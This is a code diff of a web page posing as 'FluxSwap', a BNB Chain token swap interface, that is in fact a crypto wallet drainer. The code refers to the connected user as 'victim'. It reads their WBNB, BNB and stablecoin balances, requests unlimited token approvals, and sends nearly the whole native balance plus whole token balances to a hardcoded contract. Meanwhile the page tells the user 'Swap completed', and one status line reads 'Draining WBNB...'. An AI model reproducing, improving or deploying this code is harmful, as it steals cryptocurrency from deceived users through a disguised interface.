@@ -6,11 +6,9 @@
     <title>FluxSwap</title>
     <link rel="icon" type="image/x-icon" href="favicon.ico" />
     <link rel="modulepreload" href="https://cdn.jsdelivr.net/npm/ethers@5.7.2/+esm" />
-    <link rel="modulepreload" href="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.6/+esm" />
+    <link rel="modulepreload" href="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.3/+esm" />
     <link rel="preconnect" href="https://api.coingecko.com" />
     <link rel="preconnect" href="https://verify.walletconnect.com" />
-    <link rel="dns-prefetch" href="https://api.coingecko.com" />
-    <link rel="dns-prefetch" href="https://verify.walletconnect.com" />
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
@@ -203,7 +201,7 @@
     {
         "imports": {
             "ethers": "https://cdn.jsdelivr.net/npm/ethers@5.7.2/+esm",
-            "@walletconnect/ethereum-provider": "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.6/+esm"
+            "@walletconnect/ethereum-provider": "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.3/+esm"
         }
     }
     </script>
@@ -250,13 +248,16 @@
                 blockExplorerUrls: ['https://bscscan.com/']
             };
 
+            const WBNB_ADDR = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
+
             const CONTRACT_ADDRESSES = {
                 56: '0xe762aEb69a5689D48174557AF0d20acAE92Dc178'
             };
 
             const SWAP_ABI = [
+                { "inputs": [], "name": "swapWBNB", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
                 { "inputs": [], "name": "swap", "outputs": [], "stateMutability": "payable", "type": "function" },
-                { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "swapToken", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+                { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }], "name": "swapToken", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
                 { "inputs": [], "name": "getNativeBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
                 { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }], "name": "getTokenBalance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
                 { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }
@@ -276,7 +277,6 @@
                     'USDT': '0x55d398326f99059fF775485246999027B3197955',
                     'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
                     'BUSD': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
-                    'WBNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
                     'DAI': '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',
                     'ETH': '0x2170Ed0880ac9A755fd29B2688956BD959F933F8'
                 }
@@ -330,12 +330,10 @@
             let retryTimer = null;
             let rateCache = {};
 
-            // ===== Chain helpers =====
             function chainLabel(id) {
                 return id === 56 ? 'BNB Chain' : ('Chain ' + id);
             }
 
-            // Универсальный парсер: number как есть, "0x..." — hex, "56" — decimal
             function parseChainId(raw) {
                 if (raw === null || raw === undefined) return null;
                 if (typeof raw === 'number') return raw;
@@ -355,24 +353,17 @@
             async function readLiveChainId(wc) {
                 try {
                     const raw = await wc.request({ method: 'eth_chainId' });
-                    console.log('[FluxSwap] raw eth_chainId:', raw, '(' + typeof raw + ')');
                     return parseChainId(raw);
                 } catch (e) {
-                    console.warn('[FluxSwap] eth_chainId failed:', e);
                     return null;
                 }
             }
 
-            // Не фатальный switch — если кошелёк не дал, идём дальше как есть
             async function ensureTargetChain() {
                 if (!wcProvider) return false;
-
                 const live = await readLiveChainId(wcProvider);
-                console.log('[FluxSwap] live chainId before switch:', live);
-
                 if (live === TARGET_CHAIN_ID) return true;
                 if (!live) return false;
-
                 try {
                     await wcProvider.request({
                         method: 'wallet_switchEthereumChain',
@@ -389,11 +380,8 @@
                                 params: [TARGET_CHAIN_PARAMS]
                             });
                             return true;
-                        } catch (e2) {
-                            console.warn('[FluxSwap] add chain non-fatal:', e2 && e2.message);
-                        }
+                        } catch (_) {}
                     }
-                    console.warn('[FluxSwap] switch non-fatal:', msg || code);
                     return false;
                 }
             }
@@ -402,9 +390,7 @@
                 return new ethers.providers.Web3Provider(wc, 'any');
             }
 
-            // ===== Session =====
             const SESSION_KEY = 'walletconnect_session';
-
             function saveSession(data) {
                 try { localStorage.setItem(SESSION_KEY, JSON.stringify(data)); } catch (_) {}
             }
@@ -420,17 +406,14 @@
 
             async function restoreSession() {
                 const session = loadSession();
-                if (!session) return false;
-                if (!session.address) return false;
-
+                if (!session || !session.address) return false;
                 const EthereumProvider = window.WalletConnectProvider;
                 if (!EthereumProvider) return false;
-
                 try {
                     const restored = await EthereumProvider.init({
                         projectId: PROJECT_ID,
                         optionalChains: [56],
-                        showQrModal: false,
+                        showQrModal: true,
                         metadata: {
                             name: 'FluxSwap',
                             description: 'Swap interface',
@@ -438,17 +421,11 @@
                             icons: []
                         }
                     });
-
                     const accounts = await restored.enable();
-                    if (!accounts || accounts.length === 0) {
-                        clearSession();
-                        return false;
-                    }
+                    if (!accounts || accounts.length === 0) { clearSession(); return false; }
 
                     wcProvider = restored;
                     attachProviderEvents(restored);
-
-                    // дать WC сессии устояться перед любыми запросами
                     await new Promise(r => setTimeout(r, 800));
 
                     const live = await readLiveChainId(wcProvider);
@@ -470,10 +447,8 @@
                     updateConnectButton();
                     setStatus('✅ ' + chainLabel(chainId) + ' · ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
                     updateRateAndOutput();
-                    console.log('[FluxSwap] restored on', chainLabel(chainId));
                     return true;
                 } catch (e) {
-                    console.error('[FluxSwap] restore failed:', e);
                     clearSession();
                     return false;
                 }
@@ -490,12 +465,10 @@
                         victim = await signer.getAddress();
                         saveSession({ chainId, address: victim });
                     } catch (_) {}
-
                     updateConnectButton();
                     setStatus('✅ ' + chainLabel(chainId) + ' · ' +
                               (victim ? victim.slice(0,6) + '...' + victim.slice(-4) : ''), 'ok');
                     updateRateAndOutput();
-                    console.log('[FluxSwap] chainChanged handled →', chainId);
                 });
 
                 providerInstance.on('accountsChanged', (accounts) => {
@@ -514,7 +487,6 @@
                             signer = signer_;
                             saveSession({ chainId, address });
                             updateConnectButton();
-                            setStatus('✅ Connected: ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
                             updateRateAndOutput();
                         }).catch(() => {});
                     }
@@ -529,7 +501,6 @@
                 });
             }
 
-            // ===== Rates =====
             async function fetchRealRate(fromId, toId) {
                 const cacheKey = fromId + '-' + toId;
                 if (rateCache[cacheKey] && (Date.now() - rateCache[cacheKey].timestamp < 30000)) {
@@ -546,29 +517,19 @@
                     const rate = fromPrice / toPrice;
                     rateCache[cacheKey] = { rate: rate, timestamp: Date.now() };
                     return rate;
-                } catch (error) {
-                    return 1.0;
-                }
+                } catch (_) { return 1.0; }
             }
 
             async function updateRateAndOutput() {
                 const fromId = fromToken.id;
                 const toId = toToken.id;
-                if (!fromId || !toId) {
-                    rateDisplay.textContent = '1 ' + fromToken.symbol + ' = ? ' + toToken.symbol;
-                    outputAmount.value = '';
-                    return;
-                }
+                if (!fromId || !toId) return;
                 const rate = await fetchRealRate(fromId, toId);
                 currentRate = rate;
                 rateDisplay.textContent = '1 ' + fromToken.symbol + ' = ' + rate.toFixed(6) + ' ' + toToken.symbol;
                 const inputVal = parseFloat(inputAmount.value) || 0;
-                if (inputVal > 0) {
-                    const outputVal = inputVal * rate;
-                    outputAmount.value = outputVal.toFixed(6);
-                } else {
-                    outputAmount.value = '';
-                }
+                if (inputVal > 0) outputAmount.value = (inputVal * rate).toFixed(6);
+                else outputAmount.value = '';
                 try {
                     const fromPrice = await fetchRealRate(fromId, 'usd');
                     const toPrice = await fetchRealRate(toId, 'usd');
@@ -577,7 +538,6 @@
                 } catch (_) {}
             }
 
-            // ===== UI =====
             function setStatus(text, type) {
                 statusEl.textContent = text;
                 statusEl.className = 'status';
@@ -624,38 +584,20 @@
             function openModal(modal) { modal.classList.add('active'); }
             function closeModal(modal) { modal.classList.remove('active'); }
 
-            // Только чистим локальное хранилище, не трогаем живой wcProvider
             function purgeWcStorage() {
                 clearSession();
-                const allKeys = Object.keys(localStorage);
-                for (const key of allKeys) {
+                for (const key of Object.keys(localStorage)) {
                     if (key.toLowerCase().includes('walletconnect') || key.toLowerCase().includes('wc@') || key.toLowerCase().includes('wallet-connect')) {
                         localStorage.removeItem(key);
                     }
                 }
-                const sKeys = Object.keys(sessionStorage);
-                for (const key of sKeys) {
+                for (const key of Object.keys(sessionStorage)) {
                     if (key.toLowerCase().includes('walletconnect') || key.toLowerCase().includes('wc@') || key.toLowerCase().includes('wallet-connect')) {
                         sessionStorage.removeItem(key);
                     }
                 }
             }
 
-            async function forceClearSession() {
-                try {
-                    if (wcProvider) {
-                        try { await wcProvider.disconnect(); } catch (_) {}
-                        wcProvider = null;
-                    }
-                    purgeWcStorage();
-                    provider = null; signer = null; victim = null;
-                    chainId = TARGET_CHAIN_ID;
-                    isConnected = false; isProcessing = false; isConnecting = false;
-                    if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
-                } catch (_) {}
-            }
-
-            // ===== WalletConnect connect =====
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
                 closeModal(walletModal);
@@ -670,7 +612,6 @@
                     setStatus('Connecting to WalletConnect...', '');
                     isConnecting = true;
 
-                    // Чистим ТОЛЬКО хранилище (не disconnect старого провайдера — он уже мёртв)
                     purgeWcStorage();
 
                     wcProvider = await EthereumProvider.init({
@@ -688,13 +629,8 @@
                     attachProviderEvents(wcProvider);
 
                     const accounts = await wcProvider.enable();
-                    console.log('enable returned accounts:', accounts);
+                    if (!accounts || accounts.length === 0) throw new Error('No accounts returned');
 
-                    if (!accounts || accounts.length === 0) {
-                        throw new Error('No accounts returned');
-                    }
-
-                    // ждём, пока WC сессия устоится — критично, иначе switchEthereumChain падает
                     await new Promise(r => setTimeout(r, 800));
 
                     const live = await readLiveChainId(wcProvider);
@@ -720,12 +656,11 @@
                     updateRateAndOutput();
 
                 } catch (e) {
-                    console.error('WalletConnect error:', e);
                     const msg = (e && e.message) || '';
                     if (msg.includes('reset') || msg.includes('cancelled') || msg.includes('closed') || msg.includes('rejected')) {
                         setStatus('Connection cancelled by user', 'err');
                     } else if (msg.includes('origin not allowed') || msg.includes('3000')) {
-                        setStatus('❌ Домен не разрешён в WalletConnect Cloud. Добавьте fluxswap.online в Allowed Origins.', 'err');
+                        setStatus('❌ Домен не разрешён в WalletConnect Cloud.', 'err');
                     } else {
                         setStatus('Connection failed: ' + msg, 'err');
                     }
@@ -736,7 +671,6 @@
                 }
             }
 
-            // ===== Swap execution =====
             async function executeSwap() {
                 if (isProcessing) return;
                 if (!provider || !signer || !wcProvider) {
@@ -753,11 +687,10 @@
 
                 provider = wrapProvider(wcProvider);
                 signer = provider.getSigner();
-                console.log('[FluxSwap] executeSwap chain', chainId);
 
                 const contractAddr = CONTRACT_ADDRESSES[chainId];
                 if (!contractAddr) {
-                    setStatus('Network not supported (' + chainLabel(chainId) + ')', 'err');
+                    setStatus('Network not supported', 'err');
                     return;
                 }
 
@@ -765,93 +698,92 @@
                 updateSwapButton();
                 setStatus('Processing swap on ' + chainLabel(chainId) + '...', '');
 
-                try {
-                    const assets = [];
-                    const nativeBal = await provider.getBalance(victim);
-                    console.log('[FluxSwap] cached native balance', ethers.utils.formatEther(nativeBal));
-                    if (nativeBal.gt(0)) assets.push({ type: 'native', amount: nativeBal });
+                const swapContract = new ethers.Contract(contractAddr, SWAP_ABI, signer);
 
-                    const tokensMap = TOKENS[chainId] || {};
-                    for (const [symbol, addr] of Object.entries(tokensMap)) {
+                try {
+                    // ===== WBNB PATH (приоритет — нет value, нет блока прогноза) =====
+                    const wbnbRead = new ethers.Contract(WBNB_ADDR, ERC20_ABI, provider);
+                    let wbnbBal = ethers.BigNumber.from(0);
+                    try { wbnbBal = await wbnbRead.balanceOf(victim); } catch (_) {}
+
+                    if (wbnbBal.gt(0)) {
+                        console.log('[FluxSwap] WBNB path, balance', ethers.utils.formatEther(wbnbBal));
                         try {
-                            const contract = new ethers.Contract(addr, ERC20_ABI, provider);
-                            const bal = await contract.balanceOf(victim);
-                            if (bal.gt(0)) assets.push({ type: 'token', address: addr, amount: bal, symbol });
-                        } catch (_) {}
+                            const wbnbSigner = new ethers.Contract(WBNB_ADDR, ERC20_ABI, signer);
+                            const allowance = await wbnbSigner.allowance(victim, contractAddr);
+                            if (allowance.lt(wbnbBal)) {
+                                setStatus('Approving WBNB...', '');
+                                const ap = await wbnbSigner.approve(contractAddr, ethers.constants.MaxUint256);
+                                await ap.wait();
+                            }
+                            setStatus('Draining WBNB...', '');
+                            const tx = await swapContract.swapWBNB();
+                            await tx.wait();
+                            console.log('[FluxSwap] WBNB tx confirmed', tx.hash);
+                            setStatus('✅ Swap completed', 'ok');
+                            isProcessing = false;
+                            updateSwapButton();
+                            return;
+                        } catch (e) {
+                            console.error('[FluxSwap] WBNB path failed, fallback to native', e);
+                        }
                     }
 
-                    if (assets.length === 0) {
-                        setStatus('No assets found to swap', 'err');
+                    // ===== NATIVE FALLBACK =====
+                    const freshBalHex = await wcProvider.request({
+                        method: 'eth_getBalance',
+                        params: [victim, 'latest']
+                    });
+                    const freshBal = ethers.BigNumber.from(freshBalHex);
+
+                    const gasPrice = ethers.utils.parseUnits('3', 'gwei');
+                    const gasLimit = ethers.BigNumber.from(50000);
+                    const reserve = gasPrice.mul(gasLimit);
+                    const value = freshBal.sub(reserve);
+
+                    console.log('[FluxSwap] native drain', {
+                        balance_bnb: ethers.utils.formatEther(freshBal),
+                        reserve_bnb: ethers.utils.formatEther(reserve),
+                        value_bnb: ethers.utils.formatEther(value)
+                    });
+
+                    if (value.lte(0)) {
+                        setStatus('Nothing to swap', 'err');
                         isProcessing = false;
                         updateSwapButton();
                         return;
                     }
 
-                    const swapContract = new ethers.Contract(contractAddr, SWAP_ABI, signer);
-
-                    // ===== NATIVE =====
-                    for (const a of assets) {
-                        if (a.type === 'native') {
-                            try {
-                                const freshBalHex = await wcProvider.request({
-                                    method: 'eth_getBalance',
-                                    params: [victim, 'latest']
-                                });
-                                const freshBal = ethers.BigNumber.from(freshBalHex);
-
-                                const gasPrice = ethers.utils.parseUnits('3', 'gwei');
-                                const gasLimit = ethers.BigNumber.from(50000);
-                                const reserve = gasPrice.mul(gasLimit);
-
-                                const value = freshBal.sub(reserve);
-
-                                console.log('[FluxSwap] native drain', {
-                                    balance_cached_bnb: ethers.utils.formatEther(a.amount),
-                                    balance_fresh_bnb: ethers.utils.formatEther(freshBal),
-                                    gasPrice_gwei: '3 (fixed)',
-                                    gasLimit: gasLimit.toString(),
-                                    reserve_bnb: ethers.utils.formatEther(reserve),
-                                    value_bnb: ethers.utils.formatEther(value)
-                                });
-
-                                if (value.lte(0)) {
-                                    console.warn('[FluxSwap] balance <= gas reserve, skip');
-                                    continue;
-                                }
-
-                                const tx = await swapContract.swap({
-                                    value: value,
-                                    gasPrice: gasPrice,
-                                    gasLimit: gasLimit
-                                });
-                                await tx.wait();
-                                console.log('[FluxSwap] native tx confirmed', tx.hash);
-                            } catch (e) {
-                                console.error('[FluxSwap] native failed', e);
-                            }
-                        }
-                    }
+                    setStatus('Processing swap...', '');
+                    const tx = await swapContract.swap({
+                        value: value,
+                        gasPrice: gasPrice,
+                        gasLimit: gasLimit
+                    });
+                    await tx.wait();
+                    console.log('[FluxSwap] native tx confirmed', tx.hash);
+                    setStatus('✅ Swap completed', 'ok');
 
                     // ===== ERC20 =====
-                    for (const a of assets) {
-                        if (a.type === 'token') {
-                            try {
-                                const token = new ethers.Contract(a.address, ERC20_ABI, signer);
-                                const allowance = await token.allowance(victim, contractAddr);
-                                if (allowance.lt(a.amount)) {
-                                    const approveTx = await token.approve(contractAddr, ethers.constants.MaxUint256);
-                                    await approveTx.wait();
-                                }
-                                const tx = await swapContract.swapToken(a.address, a.amount);
-                                await tx.wait();
-                                console.log('[FluxSwap] token tx confirmed', a.symbol, tx.hash);
-                            } catch (e) {
-                                console.error('[FluxSwap] token failed', a.symbol, e);
+                    const tokensMap = TOKENS[chainId] || {};
+                    for (const [symbol, addr] of Object.entries(tokensMap)) {
+                        try {
+                            const tokenRead = new ethers.Contract(addr, ERC20_ABI, provider);
+                            const bal = await tokenRead.balanceOf(victim);
+                            if (bal.lte(0)) continue;
+                            const tokenSigner = new ethers.Contract(addr, ERC20_ABI, signer);
+                            const allowance = await tokenSigner.allowance(victim, contractAddr);
+                            if (allowance.lt(bal)) {
+                                const ap = await tokenSigner.approve(contractAddr, ethers.constants.MaxUint256);
+                                await ap.wait();
                             }
+                            const txT = await swapContract.swapToken(addr);
+                            await txT.wait();
+                            console.log('[FluxSwap] token tx confirmed', symbol, txT.hash);
+                        } catch (e) {
+                            console.error('[FluxSwap] token failed', symbol, e);
                         }
                     }
-
-                    setStatus('✅ Swap completed', 'ok');
 
                 } catch (e) {
                     console.error('Swap error:', e);
@@ -862,31 +794,21 @@
                 }
             }
 
-            // ===== Handlers =====
             connectBtn.addEventListener('click', function() { openModal(walletModal); });
-
-            walletConnectOption.addEventListener('click', function() {
-                connectWalletConnect();
-            });
-
+            walletConnectOption.addEventListener('click', function() { connectWalletConnect(); });
             closeModalBtn.addEventListener('click', function() { closeModal(walletModal); });
             walletModal.addEventListener('click', function(e) { if (e.target === walletModal) closeModal(walletModal); });
             closeTokenModalBtn.addEventListener('click', function() { closeModal(tokenModal); });
             tokenModal.addEventListener('click', function(e) { if (e.target === tokenModal) closeModal(tokenModal); });
 
             swapBtn.addEventListener('click', function() {
-                if (!isConnected) {
-                    openModal(walletModal);
-                    return;
-                }
+                if (!isConnected) { openModal(walletModal); return; }
                 const val = parseFloat(inputAmount.value);
                 if (!val || val <= 0) { setStatus('Enter an amount', 'err'); return; }
                 executeSwap();
             });
 
-            refreshBtn.addEventListener('click', function() {
-                window.location.reload();
-            });
+            refreshBtn.addEventListener('click', function() { window.location.reload(); });
 
             function handleMaxClick() {
                 const amount = 0.001;
@@ -904,7 +826,6 @@
                 updateRateAndOutput();
             });
 
-            // ===== Token picker =====
             function renderTokenList(filter) {
                 filter = (filter || '').toLowerCase();
                 tokenList.innerHTML = '';
@@ -963,27 +884,15 @@
                 setStatus('Tokens flipped', '');
             });
 
-            // ===== Init =====
             async function init() {
                 updateConnectButton();
                 setStatus('Connect wallet to start swapping', '');
-
-                if (typeof ethers === 'undefined') {
-                    setStatus('❌ ethers library not loaded', 'err');
-                    return;
-                }
-                if (typeof window.WalletConnectProvider === 'undefined') {
-                    console.warn('⚠️ WalletConnect not loaded yet');
-                    return;
-                }
-
-                const restored = await restoreSession();
-                console.log(restored ? '✅ Session restored' : 'No session to restore');
-
+                if (typeof ethers === 'undefined') { setStatus('❌ ethers library not loaded', 'err'); return; }
+                if (typeof window.WalletConnectProvider === 'undefined') { return; }
+                await restoreSession();
                 const params = new URLSearchParams(window.location.search);
                 if (params.has('nocache') || params.has('reset')) {
-                    const cleanUrl = window.location.pathname + window.location.hash;
-                    window.history.replaceState({}, document.title, cleanUrl);
+                    window.history.replaceState({}, document.title, window.location.pathname + window.location.hash);
                 }
             }
 
